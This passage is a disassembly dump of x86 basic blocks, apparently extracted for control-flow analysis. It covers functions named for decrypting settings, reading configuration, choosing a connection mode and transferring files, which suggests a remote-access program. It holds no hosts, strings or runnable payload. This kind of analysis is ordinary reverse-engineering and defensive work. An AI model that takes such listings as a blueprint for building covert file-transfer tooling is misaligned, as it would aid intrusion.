|
|
v
0x8052c51:	add	esp, 0x10
0x8052c54:	test	al, al
0x8052c56:	je	0x8052d00
None
|
|
|
v
0x8052d00:	sub	esp, 0xc
0x8052d03:	push	0x80
0x8052d08:	call	0x8052879
None
|
|
|
v
0x8052c44:	add	esp, 0x10
0x8052c47:	sub	esp, 0xc
0x8052c4a:	push	0x10
0x8052c4c:	call	0x8052879
None
|
|
|
v
0x8052a58:	push	edi
0x8052a59:	push	esi
0x8052a5a:	push	ebx
0x8052a5b:	sub	esp, 0x5510
0x8052a61:	call	0x80529bf
None
|
|
|
v
0x8052a74:	add	esp, 0x10
0x8052a77:	test	al, al
0x8052a79:	je	0x8052a83
None
|
|
|
v
0x8052c8a:	add	esp, 0x18
0x8052c8d:	push	0x80565c5
0x8052c92:	push	ebx
0x8052c93:	call	0x804bca0
None
|
|
|
v
0x8052bcf:	add	esp, 0xc
0x8052bd2:	push	0x8058420
0x8052bd7:	push	ebx
0x8052bd8:	push	0x8056569
0x8052bdd:	push	0x1100
0x8052be2:	push	1
0x8052be4:	push	0x1100
0x8052be9:	lea	ebx, dword ptr [esp + 0x4424]
0x8052bf0:	push	ebx
0x8052bf1:	call	0x804bb70
None
|
|
|
v
0x8052b28:	add	esp, 0x10
0x8052b2b:	test	al, al
0x8052b2d:	je	0x8052b83
None
|
|
|
v
0x8052c5c:	sub	esp, 0xc
0x8052c5f:	push	0x80561e9
0x8052c64:	call	0x804bd10
None
|
|
|
v
0x8052b98:	sub	esp, 0xc
0x8052b9b:	push	0x80561e9
0x8052ba0:	call	0x804bd10
None
|
|
|
v
0x8052cef:	jmp	0x8052da8
None
|
|
|
v
0x8052aa2:	push	eax
0x8052aa3:	push	0x1100
0x8052aa8:	push	ebx
0x8052aa9:	lea	eax, dword ptr [esp + 0x13]
0x8052aad:	push	eax
0x8052aae:	call	0x8051ce0
None
|
|
|
v
0x8052d4d:	add	esp, 0x10
0x8052d50:	test	al, al
0x8052d52:	je	0x8052de2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:DecryptSettings
TOTAL BLOCKS :13
0x8052e17:	add	esp, 0xc
0x8052e1a:	push	0xff
0x8052e1f:	push	0x8058510
0x8052e24:	push	ebx
0x8052e25:	call	0x8054906
None
|
|
|
v
0x8052eb0:	add	esp, 0xc
0x8052eb3:	push	3
0x8052eb5:	push	0x805836c
0x8052eba:	push	ebx
0x8052ebb:	call	0x8054906
None
|
|
|
v
0x8052e04:	add	esp, 0xc
0x8052e07:	push	0xff
0x8052e0c:	push	0x8058610
0x8052e11:	push	ebx
0x8052e12:	call	0x8054906
None
|
|
|
v
0x8052e2a:	add	esp, 0xc
0x8052e2d:	push	0x20
0x8052e2f:	push	0x80584ec
0x8052e34:	push	ebx
0x8052e35:	call	0x8054906
None
|
|
|
v
0x8052e8d:	add	esp, 0xc
0x8052e90:	push	0x80
0x8052e95:	push	0x8058374
0x8052e9a:	push	ebx
0x8052e9b:	call	0x8054906
None
|
|
|
v
0x8052e6d:	add	esp, 0xc
0x8052e70:	push	0x10
0x8052e72:	push	0x8058420
0x8052e77:	push	ebx
0x8052e78:	call	0x8054906
None
|
|
|
v
0x8052dec:	push	ebx
0x8052ded:	sub	esp, 0x11c
0x8052df3:	push	0x10
0x8052df5:	push	0x80584d8
0x8052dfa:	lea	ebx, dword ptr [esp + 0x14]
0x8052dfe:	push	ebx
0x8052dff:	call	0x805488c
None
|
|
|
v
0x8052ea0:	add	esp, 0xc
0x8052ea3:	push	3
0x8052ea5:	push	0x8058370
0x8052eaa:	push	ebx
0x8052eab:	call	0x8054906
None
|
|
|
v
0x8052e4a:	add	esp, 0xc
0x8052e4d:	push	8
0x8052e4f:	push	0x80584b8
0x8052e54:	push	ebx
0x8052e55:	call	0x8054906
None
|
|
|
v
0x8052e3a:	add	esp, 0xc
0x8052e3d:	push	0x10
0x8052e3f:	push	0x80584c4
0x8052e44:	push	ebx
0x8052e45:	call	0x8054906
None
|
|
|
v
0x8052ec0:	add	esp, 0x128
0x8052ec6:	pop	ebx
0x8052ec7:	ret	
None
|
|
|
v
0x8052e5a:	add	esp, 0xc
0x8052e5d:	push	0x80
0x8052e62:	push	0x8058434
0x8052e67:	push	ebx
0x8052e68:	call	0x8054906
None
|
|
|
v
0x8052e7d:	add	esp, 0xc
0x8052e80:	push	0x26
0x8052e82:	push	0x80583f8
0x8052e87:	push	ebx
0x8052e88:	call	0x8054906
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ReadSettings
TOTAL BLOCKS :33
0x805309c:	add	esp, 0x10
0x805309f:	mov	dword ptr [ebx + 0x44], eax
0x80530a2:	mov	eax, dword ptr [0x805b9c8]
0x80530a7:	mov	dword ptr [0x805b9c8], ebx
0x80530ad:	mov	dword ptr [ebx + 0x88], eax
0x80530b3:	mov	eax, dword ptr [esp + 0xc]
0x80530b7:	cmp	dword ptr [esp + 8], eax
0x80530bb:	jl	0x8052fcb
None
|
|
|
v
0x8052ed7:	sub	esp, 0xc
0x8052eda:	push	0x48
0x8052edc:	call	0x804bd40
None
|
|
|
v
0x8052efb:	mov	dword ptr [esp + 0x18], eax
0x8052eff:	add	esp, 0x10
0x8052f02:	lea	ebp, dword ptr [esp + 0x14]
0x8052f06:	mov	eax, dword ptr [0x805b9cc]
0x8052f0b:	sub	esp, 0xc
0x8052f0e:	inc	esi
0x8052f0f:	mov	eax, dword ptr [eax + 0x44]
0x8052f12:	push	0x200
0x8052f17:	push	ebp
0x8052f18:	push	esi
0x8052f19:	push	0x3b
0x8052f1b:	push	0x8058610
0x8052f20:	mov	dword ptr [0x805b9cc], eax
0x8052f25:	call	0x80521a4
None
|
|
|
v
0x805308b:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8053057:	mov	dword ptr [ebx], eax
0x8053059:	lea	eax, dword ptr [ebx + 0x48]
0x805305c:	mov	dword ptr [esp], 0x20
0x8053063:	push	eax
0x8053064:	push	4
0x8053066:	push	0x3a
0x8053068:	push	esi
0x8053069:	call	0x80521a4
None
|
|
|
v
0x8052f90:	mov	eax, dword ptr [0x805b9cc]
0x8052f95:	mov	dword ptr [0x805b9cc], ebx
0x8052f9b:	mov	dword ptr [eax + 0x44], ebx
0x8052f9e:	pop	eax
0x8052f9f:	pop	edx
0x8052fa0:	push	0x8058510
0x8052fa5:	push	0x3b
0x8052fa7:	call	0x805215e
None
|
|
|
v
0x8052f84:	sub	esp, 0xc
0x8052f87:	add	edi, 0x44
0x8052f8a:	push	edi
0x8052f8b:	call	0x804f57c
None
|
|
|
v
0x805304c:	mov	dword ptr [ebx + 0x44], eax
0x805304f:	mov	dword ptr [esp], ebp
0x8053052:	call	0x8051de0
None
|
|
|
v
0x805302c:	sub	esp, 0xc
0x805302f:	push	8
0x8053031:	lea	edi, dword ptr [esp + 0x224]
0x8053038:	push	edi
0x8053039:	push	3
0x805303b:	push	0x3a
0x805303d:	push	esi
0x805303e:	call	0x80521a4
None
|
|
|
v
0x8052f06:	mov	eax, dword ptr [0x805b9cc]
0x8052f0b:	sub	esp, 0xc
0x8052f0e:	inc	esi
0x8052f0f:	mov	eax, dword ptr [eax + 0x44]
0x8052f12:	push	0x200
0x8052f17:	push	ebp
0x8052f18:	push	esi
0x8052f19:	push	0x3b
0x8052f1b:	push	0x8058610
0x8052f20:	mov	dword ptr [0x805b9cc], eax
0x8052f25:	call	0x80521a4
None
|
|
|
v
0x8053086:	xor	eax, eax
0x8053088:	or	ecx, 0xffffffff
0x805308b:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052f4f:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x805306e:	add	esp, 0x14
0x8053071:	push	0x20
0x8053073:	lea	eax, dword ptr [ebx + 0x68]
0x8053076:	push	eax
0x8053077:	push	5
0x8053079:	push	0x3a
0x805307b:	push	esi
0x805307c:	call	0x80521a4
None
|
|
|
v
0x8052f2a:	add	esp, 0x14
0x8052f2d:	push	0x40
0x8052f2f:	push	dword ptr [0x805b9cc]
0x8052f35:	push	1
0x8052f37:	push	0x3a
0x8052f39:	push	ebp
0x8052f3a:	call	0x80521a4
None
|
|
|
v
0x8053081:	add	esp, 0x20
0x8053084:	jmp	0x80530a2
None
|
|
|
v
0x8052fac:	mov	dword ptr [esp + 0x1c], eax
0x8052fb0:	add	esp, 0x10
0x8052fb3:	mov	dword ptr [esp + 8], 0
0x8052fbb:	lea	esi, dword ptr [esp + 0x14]
0x8052fbf:	lea	ebp, dword ptr [esp + 0x21c]
0x8052fc6:	jmp	0x80530b3
None
|
|
|
v
0x8052f3f:	mov	edx, dword ptr [0x805b9cc]
0x8052f45:	xor	eax, eax
0x8052f47:	or	ecx, 0xffffffff
0x8052f4a:	add	esp, 0x14
0x8052f4d:	mov	edi, edx
0x8052f4f:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x805308d:	sub	esp, 0xc
0x8053090:	not	ecx
0x8053092:	lea	eax, dword ptr [esi + ecx + 2]
0x8053096:	push	eax
0x8053097:	call	0x8051de0
None
|
|
|
v
0x80530b3:	mov	eax, dword ptr [esp + 0xc]
0x80530b7:	cmp	dword ptr [esp + 8], eax
0x80530bb:	jl	0x8052fcb
None
|
|
|
v
0x8053009:	add	esp, 0x14
0x805300c:	push	0x40
0x805300e:	push	edi
0x805300f:	push	2
0x8053011:	push	0x3a
0x8053013:	push	esi
0x8053014:	call	0x80521a4
None
|
|
|
v
0x8052f78:	add	esp, 0x10
0x8052f7b:	cmp	dword ptr [esp + 8], esi
0x8052f7f:	mov	dword ptr [edi + 0x44], eax
0x8052f82:	jne	0x8052f06
None
|
|
|
v
0x8052fd8:	inc	dword ptr [esp + 0x18]
0x8052fdc:	mov	dword ptr [esp], 0x200
0x8052fe3:	push	esi
0x8052fe4:	push	dword ptr [esp + 0x1c]
0x8052fe8:	mov	ebx, eax
0x8052fea:	lea	edi, dword ptr [ebx + 4]
0x8052fed:	push	0x3b
0x8052fef:	push	0x8058510
0x8052ff4:	call	0x80521a4
None
|
|
|
v
0x80530c1:	add	esp, 0x22c
0x80530c7:	pop	ebx
0x80530c8:	pop	esi
0x80530c9:	pop	edi
0x80530ca:	pop	ebp
0x80530cb:	ret	
None
|
|
|
v
0x8052ff9:	add	esp, 0x14
0x8052ffc:	push	4
0x8052ffe:	push	ebp
0x8052fff:	push	1
0x8053001:	push	0x3a
0x8053003:	push	esi
0x8053004:	call	0x80521a4
None
|
|
|
v
0x8052ee1:	mov	ebx, eax
0x8052ee3:	mov	dword ptr [ebx + 0x44], eax
0x8052ee6:	pop	ecx
0x8052ee7:	pop	esi
0x8052ee8:	xor	esi, esi
0x8052eea:	mov	dword ptr [0x805b9cc], eax
0x8052eef:	push	0x8058610
0x8052ef4:	push	0x3b
0x8052ef6:	call	0x805215e
None
|
|
|
v
0x8053022:	add	esp, 0x10
0x8053025:	cmp	eax, 2
0x8053028:	mov	dword ptr [ebx], eax
0x805302a:	jne	0x8053086
None
|
|
|
v
0x80530a2:	mov	eax, dword ptr [0x805b9c8]
0x80530a7:	mov	dword ptr [0x805b9c8], ebx
0x80530ad:	mov	dword ptr [ebx + 0x88], eax
0x80530b3:	mov	eax, dword ptr [esp + 0xc]
0x80530b7:	cmp	dword ptr [esp + 8], eax
0x80530bb:	jl	0x8052fcb
None
|
|
|
v
0x8053043:	add	esp, 0x14
0x8053046:	push	edi
0x8053047:	call	0x8051de0
None
|
|
|
v
0x8052f5f:	mov	edx, dword ptr [esp + 0x14]
0x8052f63:	mov	edi, dword ptr [0x805b9cc]
0x8052f69:	mov	dword ptr [edx + 0x40], eax
0x8052f6c:	mov	dword ptr [esp], 0x48
0x8052f73:	call	0x804bd40
None
|
|
|
v
0x8052f51:	not	ecx
0x8052f53:	add	ecx, ebp
0x8052f55:	push	ecx
0x8052f56:	mov	dword ptr [esp + 0x14], edx
0x8052f5a:	call	0x8051de0
None
|
|
|
v
0x8053019:	add	esp, 0x14
0x805301c:	push	ebp
0x805301d:	call	0x8051de0
None
|
|
|
v
0x8052ec8:	push	ebp
0x8052ec9:	push	edi
0x8052eca:	push	esi
0x8052ecb:	push	ebx
0x8052ecc:	sub	esp, 0x22c
0x8052ed2:	call	0x8052dec
None
|
|
|
v
0x8052fcb:	sub	esp, 0xc
0x8052fce:	push	0x8c
0x8052fd3:	call	0x804bd40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ConnectionMode
TOTAL BLOCKS :2
0x80530cc:	sub	esp, 0x18
0x80530cf:	push	0x805836c
0x80530d4:	call	0x8051de0
None
|
|
|
v
0x80530d9:	add	esp, 0x1c
0x80530dc:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:InitTransfersList
TOTAL BLOCKS :3
0x80530f5:	ret	
None
|
|
|
v
0x80530e0:	xor	eax, eax
0x80530e2:	mov	dword ptr [eax*4 + 0x805ba18], 0
0x80530ed:	inc	eax
0x80530ee:	cmp	eax, 0xff
0x80530f3:	jne	0x80530e2
None
|
|
|
v
0x80530e2:	mov	dword ptr [eax*4 + 0x805ba18], 0
0x80530ed:	inc	eax
0x80530ee:	cmp	eax, 0xff
0x80530f3:	jne	0x80530e2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CloseTransfer
TOTAL BLOCKS :5
0x805311a:	add	esp, 0x10
0x805311d:	mov	dword ptr [ebx*4 + 0x805ba18], 0
0x8053128:	add	esp, 8
0x805312b:	pop	ebx
0x805312c:	ret	
None
|
|
|
v
0x8053128:	add	esp, 8
0x805312b:	pop	ebx
0x805312c:	ret	
None
|
|
|
v
0x8053103:	movzx	ebx, bl
0x8053106:	mov	eax, dword ptr [ebx*4 + 0x805ba18]
0x805310d:	test	eax, eax
0x805310f:	je	0x8053128
None
|
|
|
v
0x80530f6:	push	ebx
0x80530f7:	sub	esp, 8
0x80530fa:	mov	bl, byte ptr [esp + 0x10]
0x80530fe:	cmp	bl, 0xff
0x8053101:	je	0x8053128
None
|
|
|
v
0x8053111:	sub	esp, 0xc
0x8053114:	push	eax
0x8053115:	call	0x804bbe0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CloseAllTransfers
TOTAL BLOCKS :4
0x8053133:	sub	esp, 0xc
0x8053136:	push	ebx
0x8053137:	inc	ebx
0x8053138:	call	0x80530f6
None
|
|
|
v
0x8053148:	add	esp, 8
0x805314b:	pop	ebx
0x805314c:	ret	
None
|
|
|
v
0x805312d:	push	ebx
0x805312e:	xor	ebx, ebx
0x8053130:	sub	esp, 8
0x8053133:	sub	esp, 0xc
0x8053136:	push	ebx
0x8053137:	inc	ebx
0x8053138:	call	0x80530f6
None
|
|
|
v
0x805313d:	add	esp, 0x10
0x8053140:	cmp	ebx, 0xff
0x8053146:	jne	0x8053133
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:IsTransferOpen
TOTAL BLOCKS :3
0x8053166:	ret	
None
|
|
|
v
0x8053158:	movzx	edx, dl
0x805315b:	cmp	dword ptr [edx*4 + 0x805ba18], 0
0x8053163:	setne	al
0x8053166:	ret	
None
|
|
|
v
0x805314d:	mov	dl, byte ptr [esp + 4]
0x8053151:	xor	eax, eax
0x8053153:	cmp	dl, 0xff
0x8053156:	je	0x8053166
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:TransferFile
TOTAL BLOCKS :65
0x805359a:	add	esp, 0x10
0x805359d:	mov	ecx, dword ptr [esp + 0x1d40]
0x80535a4:	mov	eax, ecx
0x80535a6:	mov	edi, dword ptr [ecx + 0x201c]
0x80535ac:	mov	ebx, dword ptr [eax + 0x2014]
0x80535b2:	mov	dword ptr [esp], ecx
0x80535b5:	mov	esi, dword ptr [ecx + 0x2018]
0x80535bb:	mov	ecx, dword ptr [ecx + 0x2010]
0x80535c1:	cmp	edi, ebx
0x80535c3:	jl	0x8053503
None
|
|
|
v
0x8053337:	pop	esi
0x8053338:	pop	ebp
0x8053339:	push	0x80560d3
0x805333e:	push	dword ptr [esp + 0x1d4c]
0x8053345:	call	0x804bca0
None
|
|
|
v
0x8053443:	jl	0x805344d
None
|
|
|
v
0x8053321:	mov	eax, dword ptr [esp + 0x1d50]
0x8053328:	movzx	eax, byte ptr [eax + 0x2020]
0x805332f:	mov	dword ptr [esp], eax
0x8053332:	call	0x80530f6
None
|
|
|
v
0x8053521:	sub	ecx, esi
0x8053523:	jmp	0x805352a
None
|
|
|
v
0x80535cb:	cmp	esi, ecx
0x80535cd:	jb	0x8053503
None
|
|
|
v
0x805334a:	add	esp, 0x10
0x805334d:	test	eax, eax
0x805334f:	mov	ebx, eax
0x8053351:	je	0x805348c
None
|
|
|
v
0x80534aa:	call	0x804e62a
None
|
|
|
v
0x8053472:	sub	esp, 0xc
0x8053475:	mov	eax, dword ptr [esp + 0x1d4c]
0x805347c:	movzx	eax, byte ptr [eax + 0x2020]
0x8053483:	push	eax
0x8053484:	call	0x80530f6
None
|
|
|
v
0x8053503:	mov	eax, ecx
0x8053505:	mov	edx, ebx
0x8053507:	sub	eax, esi
0x8053509:	sbb	edx, edi
0x805350b:	cmp	edx, 0
0x805350e:	mov	dword ptr [esp + 8], eax
0x8053512:	mov	dword ptr [esp + 0xc], edx
0x8053516:	jg	0x8053525
None
|
|
|
v
0x805328c:	mov	edx, dword ptr [esp + 0x1d70]
0x8053293:	add	esp, 0x30
0x8053296:	push	eax
0x8053297:	push	ebx
0x8053298:	movzx	eax, byte ptr [edx + 0x2008]
0x805329f:	push	eax
0x80532a0:	push	dword ptr [edx + 0x200c]
0x80532a6:	jmp	0x80534aa
None
|
|
|
v
0x8053569:	add	esp, 0x20
0x805356c:	mov	ecx, dword ptr [esp + 4]
0x8053570:	cmp	eax, ecx
0x8053572:	jne	0x80535d3
None
|
|
|
v
0x80535f1:	mov	eax, dword ptr [esp + 0x1d50]
0x80535f8:	add	eax, 0x2000
0x80535fd:	mov	dword ptr [esp], eax
0x8053600:	call	0x804f57c
None
|
|
|
v
0x80534fe:	jmp	0x805359a
None
|
|
|
v
0x8053197:	movzx	eax, byte ptr [eax + 0x2020]
0x805319e:	sub	esp, 0xc
0x80531a1:	push	eax
0x80531a2:	call	0x80530f6
None
|
|
|
v
0x8053428:	mov	eax, dword ptr [esp + 0x1d40]
0x805342f:	mov	ecx, dword ptr [eax + 0x2014]
0x8053435:	cmp	dword ptr [eax + 0x201c], ecx
0x805343b:	mov	edx, dword ptr [eax + 0x2018]
0x8053441:	jg	0x8053472
None
|
|
|
v
0x8053574:	test	eax, eax
0x8053576:	jle	0x80535d3
None
|
|
|
v
0x8053187:	jb	0x8053197
None
|
|
|
v
0x80531f1:	push	esi
0x80531f2:	push	esi
0x80531f3:	push	0x80560d6
0x80531f8:	push	dword ptr [esp + 0x1d4c]
0x80531ff:	call	0x804bca0
None
|
|
|
v
0x80535c9:	jg	0x80535d3
None
|
|
|
v
0x8053192:	jmp	0x80534b4
None
|
|
|
v
0x80531a7:	add	esp, 0xc
0x80531aa:	push	0x1100
0x80531af:	lea	ebx, dword ptr [esp + 0x26]
0x80531b3:	push	ebx
0x80531b4:	push	dword ptr [esp + 0x1d4c]
0x80531bb:	call	0x8052276
None
|
|
|
v
0x80532ab:	mov	eax, dword ptr [esp + 0x1d40]
0x80532b2:	push	1
0x80532b4:	lea	edx, dword ptr [eax + 0x2020]
0x80532ba:	push	edx
0x80532bb:	push	0x13
0x80532bd:	jmp	0x80534a4
None
|
|
|
v
0x8053425:	add	esp, 0x10
0x8053428:	mov	eax, dword ptr [esp + 0x1d40]
0x805342f:	mov	ecx, dword ptr [eax + 0x2014]
0x8053435:	cmp	dword ptr [eax + 0x201c], ecx
0x805343b:	mov	edx, dword ptr [eax + 0x2018]
0x8053441:	jg	0x8053472
None
|
|
|
v
0x8053445:	cmp	edx, dword ptr [eax + 0x2010]
0x805344b:	jae	0x8053472
None
|
|
|
v
0x805351a:	cmp	eax, 0xbff
0x805351f:	ja	0x8053525
None
|
|
|
v
0x805338a:	mov	byte ptr [esp + 0x111e], dl
0x8053391:	push	ebx
0x8053392:	push	0xc00
0x8053397:	push	1
0x8053399:	push	ebp
0x805339a:	call	0x804bce0
None
|
|
|
v
0x8053608:	sub	esp, 0xc
0x805360b:	lea	eax, dword ptr [esp + 0x1d4c]
0x8053612:	push	eax
0x8053613:	call	0x804f57c
None
|
|
|
v
0x80534df:	mov	edx, dword ptr [esp + 0x1d60]
0x80534e6:	add	esp, 0x20
0x80534e9:	push	eax
0x80534ea:	push	ebp
0x80534eb:	movzx	eax, byte ptr [edx + 0x2008]
0x80534f2:	push	eax
0x80534f3:	push	dword ptr [edx + 0x200c]
0x80534f9:	call	0x804e62a
None
|
|
|
v
0x80535d3:	mov	eax, dword ptr [esp + 0x1d40]
0x80535da:	push	0
0x80535dc:	push	0
0x80535de:	movzx	edx, byte ptr [eax + 0x200a]
0x80535e5:	push	edx
0x80535e6:	push	dword ptr [eax + 0x200c]
0x80535ec:	call	0x804e62a
None
|
|
|
v
0x805344d:	mov	dl, byte ptr [eax + 0x2020]
0x8053453:	sub	esp, 0xc
0x8053456:	movzx	eax, dl
0x8053459:	push	eax
0x805345a:	mov	byte ptr [esp + 0x14], dl
0x805345e:	call	0x805314d
None
|
|
|
v
0x80531ca:	add	esp, 0x10
0x80531cd:	test	eax, eax
0x80531cf:	jne	0x80532ab
None
|
|
|
v
0x8053518:	jl	0x8053521
None
|
|
|
v
0x8053302:	mov	edx, dword ptr [esp + 0x1d70]
0x8053309:	add	esp, 0x30
0x805330c:	push	eax
0x805330d:	push	edi
0x805330e:	movzx	eax, byte ptr [edx + 0x2008]
0x8053315:	push	eax
0x8053316:	push	dword ptr [edx + 0x200c]
0x805331c:	call	0x804e62a
None
|
|
|
v
0x805340c:	mov	eax, edx
0x805340e:	cdq	
0x805340f:	add	dword ptr [esi + 0x2018], eax
0x8053415:	adc	dword ptr [esi + 0x201c], edx
0x805341b:	sub	esp, 0xc
0x805341e:	push	5
0x8053420:	call	0x804f548
None
|
|
|
v
0x80533de:	test	eax, eax
0x80533e0:	jle	0x8053472
None
|
|
|
v
0x8053242:	mov	eax, dword ptr [esp + 0x1d50]
0x8053249:	pop	ecx
0x805324a:	movzx	edx, byte ptr [eax + 0x2020]
0x8053251:	lea	ecx, dword ptr [eax + 0x1000]
0x8053257:	mov	dword ptr [edx*4 + 0x805ba18], ebx
0x805325e:	pop	ebx
0x805325f:	push	dword ptr [eax + 0x201c]
0x8053265:	push	dword ptr [eax + 0x2018]
0x805326b:	push	ecx
0x805326c:	push	eax
0x805326d:	push	edx
0x805326e:	push	0x80565d2
0x8053273:	push	0xc02
0x8053278:	push	1
0x805327a:	push	0xc02
0x805327f:	lea	ebx, dword ptr [esp + 0x114a]
0x8053286:	push	ebx
0x8053287:	call	0x804bb70
None
|
|
|
v
0x80532b2:	push	1
0x80532b4:	lea	edx, dword ptr [eax + 0x2020]
0x80532ba:	push	edx
0x80532bb:	push	0x13
0x80532bd:	jmp	0x80534a4
None
|
|
|
v
0x805352a:	push	0xc02
0x805352f:	push	ecx
0x8053530:	mov	edx, dword ptr [esp + 8]
0x8053534:	add	esi, dword ptr [edx + 0x2000]
0x805353a:	push	esi
0x805353b:	push	ebp
0x805353c:	mov	dword ptr [esp + 0x14], ecx
0x8053540:	call	0x804bd60
None
|
|
|
v
0x80531c0:	pop	ebp
0x80531c1:	pop	eax
0x80531c2:	push	2
0x80531c4:	push	ebx
0x80531c5:	call	0x804be90
None
|
|
|
v
0x80533e6:	mov	esi, dword ptr [esp + 0x1d40]
0x80533ed:	sub	esp, 0xc
0x80533f0:	movzx	eax, byte ptr [esi + 0x2020]
0x80533f7:	push	eax
0x80533f8:	mov	dword ptr [esp + 0x14], edx
0x80533fc:	call	0x805314d
None
|
|
|
v
0x8053618:	add	esp, 0x1d3c
0x805361e:	pop	ebx
0x805361f:	pop	esi
0x8053620:	pop	edi
0x8053621:	pop	ebp
0x8053622:	ret	
None
|
|
|
v
0x8053605:	add	esp, 0x10
0x8053608:	sub	esp, 0xc
0x805360b:	lea	eax, dword ptr [esp + 0x1d4c]
0x8053612:	push	eax
0x8053613:	call	0x804f57c
None
|
|
|
v
0x805348c:	mov	eax, dword ptr [esp + 0x1d40]
0x8053493:	push	1
0x8053495:	lea	edx, dword ptr [eax + 0x2020]
0x805349b:	push	edx
0x805349c:	movzx	edx, byte ptr [eax + 0x200a]
0x80534a3:	push	edx
0x80534a4:	push	dword ptr [eax + 0x200c]
0x80534aa:	call	0x804e62a
None
|
|
|
v
0x8053357:	mov	eax, dword ptr [esp + 0x1d40]
0x805335e:	movzx	edx, byte ptr [eax + 0x2020]
0x8053365:	push	ecx
0x8053366:	push	0
0x8053368:	push	dword ptr [eax + 0x2018]
0x805336e:	mov	dword ptr [edx*4 + 0x805ba18], ebx
0x8053375:	push	ebx
0x8053376:	call	0x804bc90
None
|
|
|
v
0x8053463:	add	esp, 0x10
0x8053466:	mov	dl, byte ptr [esp + 4]
0x805346a:	test	al, al
0x805346c:	jne	0x805338a
None
|
|
|
v
0x8053545:	mov	ecx, dword ptr [esp + 0x14]
0x8053549:	mov	eax, dword ptr [esp + 0x1d50]
0x8053550:	push	ecx
0x8053551:	push	ebp
0x8053552:	movzx	edx, byte ptr [eax + 0x2009]
0x8053559:	push	edx
0x805355a:	push	dword ptr [eax + 0x200c]
0x8053560:	mov	dword ptr [esp + 0x24], ecx
0x8053564:	call	0x804e62a
None
|
|
|
v
0x80534af:	jmp	0x8053605
None
|
|
|
v
0x8053167:	push	ebp
0x8053168:	push	edi
0x8053169:	push	esi
0x805316a:	push	ebx
0x805316b:	sub	esp, 0x1d2c
0x8053171:	mov	eax, dword ptr [esp + 0x1d40]
0x8053178:	mov	edx, dword ptr [eax + 0x2004]
0x805317e:	cmp	edx, 1
0x8053181:	je	0x80532c2
None
|
|
|
v
0x8053204:	mov	ebx, eax
0x8053206:	mov	eax, dword ptr [esp + 0x1d50]
0x805320d:	add	esp, 0x10
0x8053210:	test	ebx, ebx
0x8053212:	mov	dword ptr [eax + 0x2018], 0
0x805321c:	mov	dword ptr [eax + 0x201c], 0
0x8053226:	je	0x80532b2
None
|
|
|
v
0x805337b:	add	esp, 0x10
0x805337e:	lea	ebp, dword ptr [esp + 0x111f]
0x8053385:	jmp	0x8053428
None
|
|
|
v
0x8053189:	cmp	edx, 2
0x805318c:	jne	0x8053608
None
|
|
|
v
0x80534b4:	push	edx
0x80534b5:	push	dword ptr [eax + 0x2014]
0x80534bb:	push	dword ptr [eax + 0x2010]
0x80534c1:	push	0x80565da
0x80534c6:	push	0xc02
0x80534cb:	push	1
0x80534cd:	push	0xc02
0x80534d2:	lea	ebp, dword ptr [esp + 0x113a]
0x80534d9:	push	ebp
0x80534da:	call	0x804bb70
None
|
|
|
v
0x80533cf:	add	esp, 0x10
0x80533d2:	mov	edx, dword ptr [esp + 4]
0x80533d6:	cmp	eax, esi
0x80533d8:	jne	0x8053472
None
|
|
|
v
0x80531e8:	add	esp, 0x10
0x80531eb:	test	eax, eax
0x80531ed:	mov	ebx, eax
0x80531ef:	jne	0x805322c
None
|
|
|
v
0x80532c2:	push	ebx
0x80532c3:	push	dword ptr [eax + 0x201c]
0x80532c9:	push	dword ptr [eax + 0x2018]
0x80532cf:	push	dword ptr [eax + 0x2014]
0x80532d5:	push	dword ptr [eax + 0x2010]
0x80532db:	push	eax
0x80532dc:	movzx	eax, byte ptr [eax + 0x2020]
0x80532e3:	push	eax
0x80532e4:	push	0x80565df
0x80532e9:	push	0xc02
0x80532ee:	push	1
0x80532f0:	push	0xc02
0x80532f5:	lea	edi, dword ptr [esp + 0x114a]
0x80532fc:	push	edi
0x80532fd:	call	0x804bb70
None
|
|
|
v
0x8053578:	mov	eax, dword ptr [esp + 0x1d40]
0x805357f:	mov	ebx, ecx
0x8053581:	sar	ebx, 0x1f
0x8053584:	add	dword ptr [eax + 0x2018], ecx
0x805358a:	adc	dword ptr [eax + 0x201c], ebx
0x8053590:	sub	esp, 0xc
0x8053593:	push	5
0x8053595:	call	0x804f548
None
|
|
|
v
0x805339f:	add	esp, 0x10
0x80533a2:	test	eax, eax
0x80533a4:	mov	edx, eax
0x80533a6:	jle	0x8053472
None
|
|
|
v
0x80533ac:	lea	esi, dword ptr [eax + 1]
0x80533af:	mov	eax, dword ptr [esp + 0x1d40]
0x80533b6:	push	esi
0x80533b7:	push	edi
0x80533b8:	movzx	ecx, byte ptr [eax + 0x2009]
0x80533bf:	push	ecx
0x80533c0:	push	dword ptr [eax + 0x200c]
0x80533c6:	mov	dword ptr [esp + 0x14], edx
0x80533ca:	call	0x804e62a
None
|
|
|
v
0x8053525:	mov	ecx, 0xc00
0x805352a:	push	0xc02
0x805352f:	push	ecx
0x8053530:	mov	edx, dword ptr [esp + 8]
0x8053534:	add	esi, dword ptr [edx + 0x2000]
0x805353a:	push	esi
0x805353b:	push	ebp
0x805353c:	mov	dword ptr [esp + 0x14], ecx
0x8053540:	call	0x804bd60
None
|
|
|
v
0x8053401:	add	esp, 0x10
0x8053404:	mov	edx, dword ptr [esp + 4]
0x8053408:	test	al, al
0x805340a:	je	0x8053472
None
|
|
|
v
0x8053489:	add	esp, 0x10
0x805348c:	mov	eax, dword ptr [esp + 0x1d40]
0x8053493:	push	1
0x8053495:	lea	edx, dword ptr [eax + 0x2020]
0x805349b:	push	edx
0x805349c:	movzx	edx, byte ptr [eax + 0x200a]
0x80534a3:	push	edx
0x80534a4:	push	dword ptr [eax + 0x200c]
0x80534aa:	call	0x804e62a
None
|
|
|
v
